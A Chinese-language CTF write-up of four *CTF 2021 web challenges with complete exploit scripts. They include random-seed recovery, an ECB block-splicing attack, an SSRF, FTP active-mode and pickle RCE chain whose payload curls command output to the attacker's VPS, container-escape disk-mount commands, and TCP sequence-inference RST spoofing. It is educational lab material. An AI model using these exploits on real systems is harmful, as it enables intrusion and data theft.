---
title: '*CTF 2021 Web部分 Writeup'
date: 2021-01-18 15:58:02
tags:
    - Writeup
    - CTF
    - \*CTF
---

## oh-my-note

签到题，观察源码：

```python
@app.route('/create_note', methods=['GET', 'POST'])
def create_note():
    ...
        if request.method == "POST":
            ...
            else:
                timestamp = round(time.time(), 4)
                random.seed(timestamp)
                user_id = get_random_id()
                ...
            timestamp = round(time.time(), 4)
            post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
            random.seed(user_id + post_at)
            note_id = get_random_id()

            note = Note(user_id=user_id, note_id=note_id,
                        title=title, text=text,
                        prv=prv, post_at=post_at)
    ...
```

不难发现可以根据文章发布的时间反推seed拿到对应用户的id

```python
import random
import string
import datetime
ts = 1610677740
te = 1610677800
target = 'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u'

def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])

for t in range(ts, te):
    for i in range(9999):
        timestamp = 0.0001 * i + t
        random.seed(timestamp)
        user = get_random_id()
        time = datetime.datetime.fromtimestamp(
            t, tz=datetime.timezone.utc
        ).strftime('%Y-%m-%d %H:%M UTC')
        random.seed(user + time)
        post = get_random_id()
        if post == target:
            print(timestamp, user)
```

> 然而比赛的时候作为一个星 际 人，发生了这样的事情：
{% asset_img chat.png 星 际 %}

而后`/my_notes`路由只要利用`user_id`就能列出用户的所有文章

```python
@app.route('/my_notes')
def my_notes():
    if session.get('username'):
        username = session['username']
        user_id = User.query.filter_by(username=username).first().user_id
    else:
        user_id = request.args.get('user_id')
        if not user_id:
            return redirect(url_for('index'))
```

看到flag所在文章

{% asset_img secret.png flag %}

## lottery again

题目是用的是ECB，cut and paste again。  
经过尝试，题目所用加密方式块大小为32，将随意一个明文可以如下拆分：

```json
{"lottery":"cf4cfb25-8168-49db-a
32f-4bf80e5bc785","user":"b61740
52-f23a-4dbf-937d-fed3288b8de3",
"coin":1}
```

好像没什么下手的地方？这时注意到php处理array的一个特性：当有重复键值时，取后扫描到的键值的值

```php
var_dump(['a'=>1,'a'=>2]);

// output:
array(1) {
  ["a"]=>
  int(2)
}
```

回到题目。这类题目一般的思路为：用很多账户购买lottery（或者直接伪造，当然这道题不行，因为要和数据库内的lottery id交叉比对），并用一个账户充值，购买flag。也就是说，加入我们现在有两个lottery，我们需要将其中一个lottery的user段替换成另一个lottery中的user。  
结合php array特性，我们可以将

| Lottery 1                                                                                                             | Lottery 2                                                                                                             |
| :-------------------------------------------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------- |
| {"lottery":"cf4cfb25-8168-49db-a<br>32f-4bf80e5bc785","user":"aaaaaa<br>aa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",<br>"coin":1} | {"lottery":"fbdcf544-07d3-422e-8<br>40b-d62a90c9332e","user":"bbbbbb<br>bb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",<br>"coin":2} |

Lottery 1的第三个块替换为Lottery 2的第二、第三块：

```json
{"lottery":"cf4cfb25-8168-49db-a
32f-4bf80e5bc785","user":"aaaaaa
40b-d62a90c9332e","user":"bbbbbb
bb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
"coin":1}
```

妙啊

{% spoiler 完整exploit %}

```python
from requests import session
from base64 import b64encode, b64decode

import string
import random

ses = session()


def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])


def get_user():
    usernm, passwd = get_random_id(), get_random_id()
    ses.post('http://52.149.144.45:8080/user/register', data={
        'username': usernm, 'password': passwd,
    }).json()['user']
    user = ses.post('http://52.149.144.45:8080/user/login', data={
        'username': usernm, 'password': passwd,
    }).json()['user']
    return user


flag_user = get_user()
print(flag_user)
price = ses.post('http://52.149.144.45:8080/lottery/buy', data={
    'api_token': flag_user['api_token']
}).json()['enc']

amount = 0
while amount < 9999:
    fake_user = get_user()
    for _ in range(3):
        sheep = ses.post('http://52.149.144.45:8080/lottery/buy', data={
            'api_token': fake_user['api_token']
        }).json()['enc']
        treasure = b64decode(sheep)[:64] + \
            b64decode(price)[32:96] + \
            b64decode(sheep)[96:]
        treasure = b64encode(treasure).decode()
        coin = ses.post('http://52.149.144.45:8080/lottery/info', data={
            'enc': treasure
        }).json()['info']['coin']
        amount += coin
        ses.post('http://52.149.144.45:8080/lottery/charge', data={
            'user': flag_user['uuid'],
            'coin': coin,
            'enc': treasure
        })
        print(amount)

ses.post('http://52.149.144.45:8080/flag', data={
    'api_token': flag_user['api_token']
})
```

{% endspoiler %}

## oh-my-bet

上来就是个注册页面，然而头像的选择实现得很怪，提交的表单中是`1.png`这样的文件名一样的东西，尝试目录穿越，发现确实可以读到`/etc/passwd`  
遂尝试读`/proc/self/cmdline`等，获取到源码，顺藤摸瓜看到`/app/utils.py`与`/app/config.py`

```python
# utils.py
...
def get_avatar(username):
    dirpath = os.path.dirname(__file__)
    user = User.query.filter_by(username=username).first()
    avatar = user.avatar
    if re.match('.+:.+', avatar):
        path = avatar
    else:
        path = '/'.join(['file:/', dirpath, 'static', 'img', 'avatar', avatar])
    try:
        content = base64.b64encode(urllib.request.urlopen(path).read())
    except Exception as e:
        error_path = '/'.join(['file:/', dirpath, 'static', 'img', 'avatar', 'error.png'])
        content = base64.b64encode(urllib.request.urlopen(error_path).read())
        print(e)
    return content
```

`utils.py`告诉我们用户头像是访问注册时提交的链接得到的，之后会缓存于redis中。观察可得此处的头像获取是个`urllib`任意协议ssrf  

```python
# config.py
...
    def ftp_login(self):
        ftp = FTP()
        ftp.connect("172.20.0.2", 8877)
        ftp.login("fan", "root")
        return ftp
...
    def get_config(self):
        f = self.ftp_login()
        f.cwd("files")
        buf_size = 1024
        f.retrbinary('RETR {}'.format('config.json'), self.callback, buf_size)
```

`config.py`又告诉我们flask启动时的环境变量位于`172.20.0.2`的ftp服务器中。利用上面的ssrf来取得config.json：

```json
{
    "secret_key": "f4545478ee86$%^&&%$#",
    "DEBUG": false,
    "SESSION_TYPE": "mongodb",
    "REMOTE_MONGO_IP": "172.20.0.5",
    "REMOTE_MONGO_PORT": 27017,
    "SESSION_MONGODB_DB": "admin",
    "SESSION_MONGODB_COLLECT": "sessions",
    "SESSION_PERMANENT": true,
    "SESSION_USE_SIGNER": false,
    "SESSION_KEY_PREFIX": "session:",
    "SQLALCHEMY_DATABASE_URI": "mysql+pymysql://root:starctf123456@172.20.0.3:3306/ctf?charset=utf8",
    "SQLALCHEMY_TRACK_MODIFICATIONS": true,
    "REDIS_URL": "redis://@172.20.0.4:6379/0"
}
```

此时我们发现内网有`172.20.0.0/29`共五台服务器（1为宿主机，不计）  
mysql估计是出题人想用来存payload审payload的，没啥用，hint也说了不要管redis，重点在于mongodb中存储了session对象。  
题目用到了`flask_session`，而`flask_session`使用的serializer默认是pickle（貌似现在也不支持改），也就是说只要能将恶意pickle数据塞到mongodb里就可以了

经尝试，利用`ftp://fan:root@172.20.0.2/`这样的url可以列出ftp服务器内的文件，下载`ftp-server.py`  
首先看权限：`authorizer.add_user("fan", "root", ".", perm="elrafmwMT")`，有权限写  

urllib这个ssrf还能怎么样进一步利用呢？略作百(gu)度(ge)可以找到[这个CVE](https://bugs.python.org/issue36276)  
不出意料，urllib在题目环境的版本中存在CRLF注入，我们可以在url的任意一个part注入换行符。这样，我们就可以完整地控制ftp客户端的行为了。

参考[这篇文章](http://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/)，我们发现ftp竟然还有主动模式这一说。  
plaid里的这道题利用ftp主动模式可以将ftp服务器内可控的二进制文件发送到任意ip的任意端口，对这道题来说问题就在于如何控制ftp服务器里的文件。  
经尝试（其实也能搜到），主动模式不仅可以用于文件的下载，还可以用于文件的上传。也就是说只要指示ftp服务器到我们自己的服务器来下载文件就好了。  

此时，我们成功地将CRLF注入型SSRF提升为了完整的无状态二进制流SSRF（自己瞎起的名字），类似gopher

```python
bind = '自己的IP:端口'
targ = 'SSRF的目标IP:端口'

def get_port_cmd(host):
    host, port = host.split(':')
    port = int(port)
    return 'PORT ' + ','.join(host.split('.') + [str(port // 256), str(port - port // 256 * 256)])

def inject(cmd):
    cmd = '\r\n'.join(cmd)
    return ssrf(f'''ftp://fan:root{cmd}@{ftpd}/''')

def sendfile(file):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', int(bind.split(':')[1])))
    sock.listen(1)
    (client, address) = sock.accept()
    print('accepted', address)
    client.send(file)
    print('sent')
    client.close()

thread = threading.Thread(target=sendfile, args=(request,))
thread.start()
inject(['TYPE I', get_port_cmd(bind), 'STOR frankli'])
thread.join()
print('replaying')
inject(['TYPE I', get_port_cmd(targ), 'RETR frankli'])
```

接下来的任务就是向mongodb发起一个update请求，修改数据库里的session序列化数据。如何构造这个数据包呢，我赛后问了出题人和别的队伍的同学，基本有下面几种：

1. 分析mongodb数据包，并手动构造（肝败吓疯）
2. 查[文档](https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/)，手动构造
3. 抓包重放（出题人）
4. 我的办法

我的办法比较脏，但是也比较好玩。众所周知python啥都能干，比如pymongo。然而pymongo是主动去连服务器的，怎么获取到数据包本身呢？  
改代码呗，去`site-packages/pymongo/network.py:142`，在sendall之前丢  个  异  常

{% asset_img exception.png 我看是你脑子有异常 %}

然后就可以愉快地拿到mongo请求了。  
只是有一点要注意，下面这个脚本跑的时候在localhost也得启动一个mongo实例/docker，不然pymongo发别的ping包之类的会阻塞。

```python
from pymongo import MongoClient
import pickle
import os

def get_pickle(cmd):
    class exp(object):
        def __reduce__(self):
            return (os.system, (cmd,))
    return pickle.dumps(exp())

def get_mongo(cmd):
    client = MongoClient('localhost', 27017)
    coll = client.admin.sessions
    try:
        coll.update_one(
            {'id':'session:37386ce1-3fe8-4f1d-91fc-224581c5279f'},
            {"$set": { "val": get_pickle(cmd) }},
            upsert=True
        )
    except Exception as e:
        return e.message

if __name__ == '__main__':
    print(get_mongo('ls'))
```

{% spoiler 剩下的exploit %}

```python
from base64 import b64decode
import requests
import socket
import string
import random
import threading


def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])


def get_port_cmd(host):
    host, port = host.split(':')
    port = int(port)
    return 'PORT ' + ','.join(host.split('.') + [str(port // 256), str(port - port // 256 * 256)])


a = 'http://52.163.52.206:8088'
a = 'http://23.98.68.11:8088'

ftpd = '172.20.0.2:8877'
redis = '172.20.0.4:6379'
mongo = '172.20.0.5:27017'

bind = 'vps_ip:2334'
targ = mongo

from mongo import get_mongo
request = get_mongo('curl vps_ip:1234/ -H "Host: `ip a|base64`"')


def ssrf(url):
    page = requests.post(a + '/login', data={
        'username': get_random_id(),
        'password': get_random_id(),
        'avatar': url,
        'submit': 'Go!'
    }).text
    page = page[page.find('data:image/png;base64,') +
                len('data:image/png;base64,'):]
    page = page[:page.find('"')]
    try:
        page = b64decode(page).decode()
    except:
        page = b64decode(page)
    return page

def inject(cmd):
    cmd = '\r\n'.join(cmd)
    return ssrf(f'''ftp://fan:root{cmd}@{ftpd}/''')

def sendfile(file):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', int(bind.split(':')[1])))
    sock.listen(1)
    (client, address) = sock.accept()
    print('accepted', address)
    client.send(file)
    print('sent')
    client.close()


thread = threading.Thread(target=sendfile, args=(request,))
thread.start()

print(ssrf(f'ftp://fan:root@{ftpd}/'))

inject(['TYPE I', get_port_cmd(bind), 'STOR frankli'])
thread.join()
print('uploaded')
print(ssrf(f'ftp://fan:root@{ftpd}/'))
print('replaying')
inject(['TYPE I', get_port_cmd(targ), 'RETR frankli'])
print('replayed')
print(requests.get(a, cookies={'session': '1eb74496-98b9-4acc-94fb-75ba15ddb803'}).headers)
print('requested')
inject(['RNFR frankli', 'RNTO trash'])
print(ssrf(f'ftp://fan:root@{ftpd}/'))
```

{% endspoiler %}

## oh-my-socket

不行，必须要公开处刑（逃

为什么题在放出来半个小时后就去fix了呢？

{% asset_img privileged.png 特 权 阶 级 %}

```python
import os

# os.system('fdisk -l')
os.system('mkdir -p /mnt/test')
os.system('mount /dev/vda1 /mnt/test')
# os.system('cat /mnt/test/lib/systemd/system/docker.*')
# os.system('chroot /mnt/test find . -name "oh-some-funny-code"')
os.system('cat /mnt/test/var/lib/docker/overlay2/*/diff/server/oh-some-funny-code')
# os.system('chroot /mnt/test service docker status')
```

{% asset_img result.png 结 束 了 %}

还是我太善良了，没干什么坏事

这道题的正解是这样的：

观察题目，我们能发现server上有flag，还有一个flag service。还有一个client，client上还有任意文件读。我们作为webserver可以执行80秒任意代码，并且出题人贴心地为我们装上了scapy便于tcp包的构造。

这个flag service是阻塞式的服务，也就是说上一个人不断开的话下一个人连不了。然而client上的客户端在启动时就往server那里连了，并且双方都在**阻塞**地等待对方的数据（recv），而且还没设置超时，而且还每两分钟就重启一次。看上去有点不太可能实现的样子。  
但是当我们仔细观察client的源码，当收到了connection reset（RST）时，client会断开与server端的连接。也就是说我们需要伪造一个从server到client的RST，这时候才能轮到我们去连server。  

众所周知（个鬼啊），TCP数据包伪造的重点在于其seq的值。

IP头中，Source IP Address，Destination IP Address我们都有，Protocol是TCP，别的无所谓，都是能自动构造好的
TCP头中，Source Port，Destination Port我们也都有，client那边都bind好了，问题就在于：  
双方进行三次握手的过程如下：

1. client向server发送一个同步包(SYN)，序列号为随机数A
2. 1: 服务端响应(ACK)包，序列号为A+1; 2: 服务端发送同步包(SYN)，序列号为随机数B （即一个SYN-ACK包）
3. 客户端发送响应包，序列号为B+1

后面的数据包的sequence序列号只能落在`(last_seq, last_seq + recv_window)`这个范围内。

参考[linux源码:tcp_validate_incoming](https://github.com/torvalds/linux/blob/19c329f6808995b142b3966301f217c831e7cf31/net/ipv4/tcp_input.c#L5609-L5628)，当然RFC或者计网课本都行，只是待会会用到这个

```cpp
static inline bool tcp_sequence(const struct tcp_sock *tp, u32 seq, u32 end_seq) {
    return !before(end_seq, tp->rcv_wup) && !after(seq, tp->rcv_nxt + tcp_receive_window(tp));
}
```

然后他俩就静默了。如果有任何一方发送了数据包，我们都有可能能抓到这个包，看到seq，这样这个题将绝杀，可是抓不得。

顺着出题人的思路，我们找到了几个paper，还找到了一次看雪论坛的演讲：

1. https://www.microsoft.com/en-us/research/wp-content/uploads/2012/10/ccs12-qian.pdf
2. https://web.eecs.umich.edu/~zmao/Papers/oakland12_TCP_sequence_number_inference.pdf
3. https://bbs.pediy.com/thread-245982.htm#:~:text=第二个攻击变种

根据上面的资料，我们继续往下跟刚才的linux中的`tcp_validate_incoming`，看到如果seq检查不通过的话进到的分支：

```cpp
if (!th->rst) {
    if (th->syn)
        goto syn_challenge;
    if (!tcp_oow_rate_limited(sock_net(sk), skb, LINUX_MIB_TCPACKSKIPPEDSEQ, &tp->last_oow_ack_time))
        tcp_send_dupack(sk, skb);
} else if (tcp_reset_check(sk, skb)) {
    tcp_reset(sk, skb);
}
```

如果我们发的包不是RST，且不是SYN，如果seq检查不通过，且linux还不至于认为我们在flood它的话，会进到`tcp_send_dupack`，我们进去康康有什么

```cpp
static void tcp_send_dupack(struct sock *sk, const struct sk_buff *skb) {
    struct tcp_sock *tp = tcp_sk(sk);
    if (TCP_SKB_CB(skb)->end_seq != TCP_SKB_CB(skb)->seq &&
        before(TCP_SKB_CB(skb)->seq, tp->rcv_nxt)) {
        NET_INC_STATS(sock_net(sk), LINUX_MIB_DELAYEDACKLOST);
        tcp_enter_quickack_mode(sk, TCP_MAX_QUICKACKS);
        // 省略
    }
    tcp_send_ack(sk);
}
```

这个before的换行位置是真的阴间，我看了半天才发现这玩意在条件判断**里头**  
这里有个很有意思的东西，`NET_INC_STATS(sock_net(sk), LINUX_MIB_DELAYEDACKLOST);`  
就是说如果我们发送的这个数据包的seq比当前想要接收到的seq要小的话，linux会将DELAYEDACKLOST的值增加1。  
这个数值在哪里体现呢？在`/proc/<pid>/net/netstat`里头就有。

{% asset_img netstat.png netstat %}

也就是说我们不仅能知道我们的seq对还是错（这样我们需要遍历整个int32，不至于到天涯海角吧至少80秒是有了），而且还能知道seq大还是小。  
这样我们就能用小学二年级就学过的二分法，最多发32来个包，就能得到在窗口范围内的seq，进而伪造发送给client的RST包。

{% spoiler 参考脚本 %}

```python
from pprint import pprint
from requests import session
from scapy.all import *
import time

ses = session()
# conf.L3socket = L3RawSocket
client = '172.21.0.3'
server = '172.21.0.2'


def build(seq):
    ip = IP(src=server, dst=client)
    tcp = TCP(sport=21587, dport=7775, flags="A", seq=seq)
    pkt = ip / tcp / 'payload'
    return pkt


def read(name):
    return ses.get(f'http://{client}:5000/file', params={'name': name}).text


def parse(text):
    res = {}
    lines = text.split('\n')
    for i in range(0, len(lines), 2):
        if not len(lines[i]):
            break
        key, keys = lines[i].split(': ')
        key, vals = lines[i + 1].split(': ')
        res[key] = dict(zip(keys.split(' '), vals.split(' ')))
    return res


netstat = parse(read('/proc/1/net/netstat'))
initial = netstat['TcpExt']['DelayedACKLost']
seq_now = 0

for i in range(2**4):
    send(build(i << 27))
    netstat = parse(read('/proc/1/net/netstat'))
    if netstat['TcpExt']['DelayedACKLost'] > initial:
        seq_now = i << 27

for i in range(4, 31):
    send(build(seq_now | (1 << (31 - i))))
    netstat = parse(read('/proc/1/net/netstat'))
    if netstat['TcpExt']['DelayedACKLost'] == initial + 1:
        seq_now |= (1 << (31 - i))
    elif netstat['TcpExt']['DelayedACKLost'] > initial:
        # conflict
        exit(1)
    time.sleep(0.5)

print(seq_now)
```

{% endspoiler %}

然而出题人，对不起，你这还是有非预期。

~~我们再来仔细看看`docker-compose.yml`，看看是不是少了什么（自行看附件去）~~
~~对的，没有depends_on，即使有可能也有问题。~~
修正：docker-compose.yml中确实有depends_on，但是仍然有启动顺序上的问题。

请读到这篇博客的同学熟背下面链接里的东西
https://docs.docker.com/compose/startup-order/

根据我个人的调查，一血的payload是这样的：

```python
from socket import *
try:
    tcpSerSock = socket(AF_INET, SOCK_STREAM)
    tcpSerSock.connect(('172.25.0.2', 21587))
    tcpSerSock.send(b'*ctf')
    print(tcpSerSock.recv(1280))
except Exception as e:
    print("ERROR", e)
```

二血更是离谱，直接进去弹了个shell，上了一血的车，代码里直接就有flag（我也不知道为什么flag会在代码的注释里）

{% asset_img flag_in_py.png what?? %}

。。。所以说，这是多么悲伤的故事

## 总结

没有。
